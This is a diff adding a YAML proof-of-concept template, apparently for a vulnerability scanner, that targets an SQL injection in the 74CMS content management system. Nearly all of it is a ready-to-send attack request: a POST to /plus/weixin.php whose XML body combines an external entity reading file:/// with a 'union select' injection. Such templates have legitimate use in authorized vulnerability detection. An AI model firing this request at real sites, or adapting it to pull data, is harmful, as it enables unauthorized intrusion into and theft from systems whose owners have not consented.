@@ -1,0 +1,19 @@
+id: yaml-poc-74cms-74cms-sql_injection-CT-530904
+info:
+  name: Yaml Poc 74Cms 74Cms Sql_Injection Ct 530904
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-74cms-74cms-sql_injection-CT-530904'
+  tags: sqli
+  reference:
+  - http://cn-sec.com/archives/25900.html
+http:
+- method: POST
+  path:
+  - /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce=
+  body: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM
+    "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%'
+    union select md5({{rand}})#</Content></xml>
+  headers:
+    Content-Type: text/xml
+  redirects: false
